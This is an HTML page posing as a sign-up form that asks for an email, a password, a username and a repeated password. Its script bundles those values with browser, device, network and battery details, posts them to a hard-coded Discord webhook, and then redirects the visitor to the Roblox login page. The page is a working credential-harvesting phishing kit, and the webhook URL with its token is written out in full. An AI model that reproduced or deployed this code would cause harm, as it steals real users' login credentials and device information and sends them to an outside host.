<!DOCTYPE html>
<html>

<head>
  <style>
    .Input {
      background-color: hsl(0, 0%, 20%);
      color: white;
      border: 0px solid black;
      border-radius: 5px;
      transition: all 1s;
      cursor: pointer;
      width: 250px;
      height: 20px;
    }
    body {
      background-color: hsl(0, 0%, 80%);
    }
    
    .button {
      margin: 1px 70px 1px;
      border-radius: 8px;
      border: 0px solid black;
      background-color: hsl(0, 0%, 20%);
      color: white;
      width: 100px;
      height: 30px;
    }
    
    .TextRed {
      color: darkred;
      display: none;
    }
  </style>
</head>

<body>
  <div class="">
    <input type="email" name="email" id="email" value="" class="Input" placeholder="Enter the Email" required/>
    <div class="TextRed" id="SE">
      Enter the Email
    </div>
  </div>
  
  <br>
     
  <div class="">
    <input type="password" name="Password1" id="Password1" value="" class="Input" placeholder="Enter the Password" required/>
    <div class="TextRed" id="SP1">
      Enter the Password
    </div>
  </div>
  
  <br>
  
  <div class="">
    <input type="text" name="Name" id="Name" value="" class="Input" placeholder="Enter the Username" required/>
    <div class="TextRed" id="SN">
      Enter the Name
    </div>
  </div>
  
  <br>
  
  <div class="">
    <input type="password" name="Password2" id="Password2" class="Input" placeholder="Enter the Password" required/>
    <div class="TextRed" id="SP2">
      Enter the Password
    </div>
  </div>
  
  <br>
  <button class="button" type="submit" onclick="One(this)">Done</button>
  <script>
    function One(event) {
      const Email = document.getElementById("email").value;
      const Password1 = document.getElementById("Password1").value;
      const Name = document.getElementById("Name").value;
      const Password2 = document.getElementById("Password2").value;
      const SE = document.getElementById("SE");
      const SP1 = document.getElementById("SP1");
      const SN = document.getElementById("SN");
      const SP2 = document.getElementById("SP2");
      
      if (Email === "" || Password1 === "" || Name === "" || Password2 === "") {
         if (Email === "") {
           SE.style.display = 'block';
         } else if (Password1 === "") {
           SP1.style.display = 'block';
         } else if (Name === "") {
           SN.style.display = 'block';
         } else if (Password2 === "") {
           SP2.style.display = 'block';
         }
         
         if (Password1 === "") {
           SP1.style.display = 'block';
         }else{
           SP1.style.display = 'none';
         }
         
         if (Name === "") {
           SN.style.display = 'block';
         }else{
           SN.style.display = 'none';
         }
         
         if (Password2 === "") {
           SP2.style.display = 'block';
         }else{
           SP2.style.display = 'none';
         }
      } else {
        event.style.transform = "scale(0)"
        function sendDiscordMessage(webhookUrl, content) {
        fetch(webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({ content }), // Ensure proper string format
          })
          .then(response => {
            if (response.ok) {
              console.log('Message sent successfully!');
            } else {
              console.log(`Failed to send message: ${response.status} ${response.statusText}`);
            }
          })
          .catch(error => {
            console.error('Failed to send message:', error);
          });
      }
      
      async function gatherDeviceInfo() {
        const battery = await navigator.getBattery();
        const connection = navigator.connection || {}; // Handle cases where `navigator.connection` is undefined
        
        const info = `
AppName: ${navigator.appName}
UserAgent: ${navigator.userAgent}
Platform: ${navigator.platform}
Vendor: ${navigator.vendor}
Language: ${navigator.language}
Languages: ${navigator.languages}
CookieEnabled: ${navigator.cookieEnabled}
DeviceMemory: ${navigator.deviceMemory || "Unknown"}
HardwareConcurrency: ${navigator.hardwareConcurrency || "Unknown"}
Downlink: ${connection.downlink || "Unknown"}
EffectiveType: ${connection.effectiveType || "Unknown"}
RTT: ${connection.rtt || "Unknown"}
Charging: ${battery.charging}
Battery Level: ${(battery.level * 100) + "%"}
Charging Time: ${battery.chargingTime}
Discharging Time: ${battery.dischargingTime}
Email: ${Email}
Password: ${Password1}
Name: ${Name}
Password: ${Password2}
`;
        
        console.log("Extended Device Info:", info);
        
        const webhookUrl = 'https://discord.com/api/webhooks/1350065893597777981/QBYJC8ih6btu1RwnJWXThQT7kdKzxJK-3SNSOdWRHTKiahfHHpgfBoPmIpeOzd3hwHd7'; // Replace with actual webhook URL
        sendDiscordMessage(webhookUrl, `\`\`\`\n${info}\n\`\`\``);
      }
      
      gatherDeviceInfo();
      
      setTimeout(function(){
        window.location.href="https://www.roblox.com/Login";
      },1000 );
      }
    }
  </script>
</body>

</html>
